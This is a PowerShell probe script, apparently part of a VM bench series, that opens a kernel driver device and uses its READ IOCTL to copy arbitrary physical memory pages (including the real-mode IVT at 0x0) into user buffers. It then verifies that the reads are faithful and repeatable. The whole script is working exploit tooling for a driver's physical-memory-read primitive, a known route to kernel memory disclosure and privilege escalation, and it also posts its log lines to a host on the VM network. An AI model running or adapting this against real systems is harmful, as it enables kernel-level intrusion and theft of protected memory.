# p99_guest.ps1 -- READ address-fidelity probe (VM bench).
#
# p97b-v8 proved READ lands bytes and that the close-first/free-after ordering survives
# (2/2, byte-identical, P97VM_DONE). It does NOT prove the bytes came from the PA we asked
# for: both runs asked 0x100000 and both got the same x64 prologue, which a fixed stub would
# also produce. This probe separates those cases (R5: one variable = which PA).
#
# Signature of a faithful read: different PAs -> different pages; the SAME PA twice -> identical;
# pa=0 (real-mode IVT) -> mostly zeros, not code.
# One dst page per PA, because the driver's copy is deferred to IRP_MJ_CLOSE and would
# otherwise overwrite a shared landing page; close before any VirtualFree (p91 fix).
$ErrorActionPreference = 'Continue'
trap { L ('EXC ' + $_.Exception.GetType().Name + ': ' + $_.Exception.Message + ' @L' + $_.InvocationInfo.ScriptLineNumber) ; continue }
$dir = 'C:\Users\Public\p37'
$out = Join-Path $dir '_p99_guest.txt'
$base = 'http://10.0.2.2:8080'
$IOCTL_READ = 0xC3502014L
$PAGE = 0x1000

function L([string]$m) {
    $line = (Get-Date -f 'HH:mm:ss') + '  ' + $m
    try { Add-Content -LiteralPath $out -Value $line -ErrorAction SilentlyContinue } catch { }
    Write-Output $line
    try { (New-Object Net.WebClient).UploadString("$base/log?vm=p99", $line) } catch { }
}

if (-not (Test-Path -LiteralPath $dir)) { New-Item -ItemType Directory -Path $dir -Force | Out-Null }
$VER = 'p99-v1'
$lock = Join-Path $dir '_p99.lock'
if (Test-Path -LiteralPath $lock) {
    $age = ((Get-Date) - (Get-Item -LiteralPath $lock).LastWriteTime).TotalSeconds
    if ($age -lt 45) { L ("skip $VER lock age=" + [int]$age) ; exit 0 }
}
Set-Content -LiteralPath $lock -Value (Get-Date -f 'HH:mm:ss') -Encoding ascii
L ("=== p99 guest-entry version=$VER")
Add-Type -TypeDefinition @'
using System;
using System.Runtime.InteropServices;
public class P99 {
    [DllImport("kernel32", SetLastError=true, CharSet=CharSet.Unicode)]
    public static extern IntPtr CreateFileW(string n, uint acc, uint share, IntPtr sa, uint disp, uint flags, IntPtr tmpl);
    [DllImport("kernel32", SetLastError=true)]
    public static extern bool DeviceIoControl(IntPtr h, uint code, byte[] inb, uint inlen, byte[] outb, uint outlen, out uint ret, IntPtr ov);
    [DllImport("kernel32", SetLastError=true)]
    public static extern bool VirtualLock(IntPtr p, uint n);
    [DllImport("kernel32", SetLastError=true)]
    public static extern IntPtr VirtualAlloc(IntPtr a, uint n, uint t, uint p);
    [DllImport("kernel32", SetLastError=true)]
    public static extern bool VirtualFree(IntPtr p, uint n, uint t);
    [DllImport("kernel32")]
    public static extern bool CloseHandle(IntPtr h);
    [DllImport("kernel32", SetLastError=true)]
    public static extern uint GetFileType(IntPtr h);
}
'@ -ErrorAction SilentlyContinue

function Hex([byte[]]$b) { if (-not $b) { return '' } ; return (($b | ForEach-Object { $_.ToString('x2') }) -join '') }

$os = Get-CimInstance Win32_OperatingSystem -ErrorAction SilentlyContinue
$up = 0
if ($os) { $up = [int]((Get-Date) - $os.LastBootUpTime).TotalSeconds }
$svc = (sc.exe query gdrv3 2>&1 | Select-String 'STATE') -join ';'
L ("=== p99 start {0} up={1}s" -f (Get-Date -f 'yyyy-MM-dd HH:mm:ss'), $up)
L ("pre svc: " + $svc.Trim())

$h = [IntPtr]::Zero
foreach ($dev in '\\.\GIOV3', '\\.\gdrv3', '\\.\GIO', '\\.\gio') {
    $try = [P99]::CreateFileW($dev, 0xC0000000L, 3, [IntPtr]::Zero, 3, 0, [IntPtr]::Zero)
    $tv = 0
    if ($try) { $tv = $try.ToInt64() }
    $oe = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
    if ($tv -ne 0 -and $tv -ne -1) { $h = $try ; L ("open ok $dev handle=$tv filetype=" + [P99]::GetFileType($h)) ; break }
    L ("open FAILED $dev h=$tv err=$oe")
}
if (-not $h -or $h.ToInt64() -eq 0) { L 'no device -> abort' ; L 'VERDICT: NO_DEVICE' ; exit 1 }

# Same PA twice (determinism) interleaved with distinct PAs (faithfulness). pa=0 is the IVT.
$targets = @(0x0, 0x100000, 0x0, 0x1000, 0x200000, 0x100000)

$canary = New-Object byte[] $PAGE
for ($i = 0; $i -lt $PAGE; $i++) { $canary[$i] = [byte]($i -band 0xFF) }

$pages = @()
$ib = New-Object byte[] 24
foreach ($t in $targets) {
    $p = [P99]::VirtualAlloc([IntPtr]::Zero, $PAGE, 0x3000, 0x04)
    if (-not $p -or $p -eq [IntPtr]::Zero) { L 'VirtualAlloc FAILED' ; break }
    [Runtime.InteropServices.Marshal]::Copy($canary, 0, $p, $PAGE)
    [P99]::VirtualLock($p, $PAGE) | Out-Null
    $pages += $p

    [Array]::Copy([BitConverter]::GetBytes([uint64]$t), 0, $ib, 0, 8)
    [Array]::Copy([BitConverter]::GetBytes([uint32]$PAGE), 0, $ib, 8, 4)
    [Array]::Copy([BitConverter]::GetBytes([uint64]$p.ToInt64()), 0, $ib, 16, 8)
    L ("BEFORE read[{0}] pa=0x{1:x} dst=0x{2:x}" -f ($pages.Count - 1), $t, $p.ToInt64())
    $ob = New-Object byte[] $PAGE
    $got = [uint32]0
    $ok = [P99]::DeviceIoControl($h, $IOCTL_READ, $ib, [uint32]$ib.Length, $ob, [uint32]$ob.Length, [ref]$got, [IntPtr]::Zero)
    $err = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
    L ("  read[{0}] ok={1} err={2} got={3}" -f ($pages.Count - 1), [int]$ok, [int]$err, [int]$got)
}

L ("buffers={0} -> close first, read back after, free last" -f $pages.Count)
if ($h) { [P99]::CloseHandle($h) | Out-Null }
L ("closed " + (Get-Date -f 'HH:mm:ss'))

$idx = 0
foreach ($p in $pages) {
    $back = New-Object byte[] $PAGE
    [Runtime.InteropServices.Marshal]::Copy($p, $back, 0, $PAGE)
    $d = 0
    for ($i = 0; $i -lt $PAGE; $i++) { if ($back[$i] -ne $canary[$i]) { $d++ } }
    L ("POST[{0}] pa=0x{1:x} diff={2} head={3} tail={4}" -f $idx, $targets[$idx], $d, (Hex ($back[0..15])), (Hex ($back[($PAGE-16)..($PAGE-1)])))
    $idx++
}

# verdict: A==C (0x0 twice) and B==F (0x100000 twice) must be equal; different PAs must differ.
$g = @()
foreach ($p in $pages) {
    if (-not $p) { $g += '' ; continue }
    $b = New-Object byte[] 64
    [Runtime.InteropServices.Marshal]::Copy($p, $b, 0, 64)
    $g += (Hex $b)
}
$det = ($g[0] -eq $g[2]) -and ($g[1] -eq $g[5])
$dist = ($g[1] -ne $g[3]) -and ($g[3] -ne $g[4]) -and ($g[0] -ne $g[1])
$zero = ($g[0] -match '^0{32}') -or (($g[0].ToCharArray() | Where-Object { $_ -ne '0' }).Count -lt 8)
L ("RESULT repeatable={0} distinct={1} ivt_near_zero={2}" -f $det, $dist, $zero)
if ($det -and $dist -and $zero) { L 'VERDICT: READ_FAITHFUL' }
elseif (-not $det) { L 'VERDICT: READ_UNSTABLE' }
elseif (-not $dist) { L 'VERDICT: READ_FIXED_STUB' }
else { L 'VERDICT: READ_INCONCLUSIVE_IVT' }

foreach ($p in $pages) { if ($p) { [P99]::VirtualFree($p, 0, 0x8000) | Out-Null } }
L "freed"
L ("VERDICT: P99_DONE " + (Get-Date -f 'yyyy-MM-dd HH:mm:ss'))

